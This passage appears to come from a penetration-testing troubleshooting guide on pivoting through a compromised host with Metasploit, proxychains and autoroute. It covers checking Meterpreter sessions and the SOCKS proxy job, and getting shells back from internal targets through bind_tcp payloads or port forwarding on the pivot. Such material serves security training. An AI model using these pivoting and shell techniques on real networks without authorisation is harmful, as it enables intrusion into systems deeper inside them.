- Decide:
  - Re-orient: Is the Meterpreter session of the PivotBox still active?
  - Act: 
    ```text
    msf6 > sessions -l
    ```
    If the conversation has ended, the PivotBox must be reexploited.
  - Re-Observe: Is `socks_proxy` module running?
  - Act:
    ```text
    msf6 > jobs
    ```
    If the module is not running, rerun it
  - Re-Observe: Is the etc/proxychains.conf file correct?
  - Act
    ```bash
    tail /etc/proxychains.conf # the last line should match the sock proxy setting
    ```
  - Re-Orient: If the command is misused, such as `nmap -sS`?
  - Act: Correct the command

  > Proxychains forwards TCP connections via SOCKS/HTTP proxy chains. It can only handle complete TCP connection requests (i.e. the connect() system call). Consequently, any scanning method relying on raw sockets cannot function through Proxychains.

  ### Issue 2 Exploit Succeed But No Session Created

  - Orient: `autoroute` has been configured, but the exploit module is unable to gain a shell.
  - Decide:

    **Core logic**: `autoroute` permits the attack machine (Kali) to connect to internal targets, but it does not permit internal targets to connect back to the attack machine.
    - Orient: Using the `reverse_tcp` payload to run the Exploit module succeeded, but the shell promptly terminated.
    - Orient: The target attempted to reconnect to the attack machine, but it lacked the routing to the attack machine's network.
    - Act 1: Using the `bind_tcp` payload, or
    - Act 2: Configure `LHOST` to the PivotBox's internal IP address, and set up port forwarding on the PivotBox to relay the shell back to the attack machine. 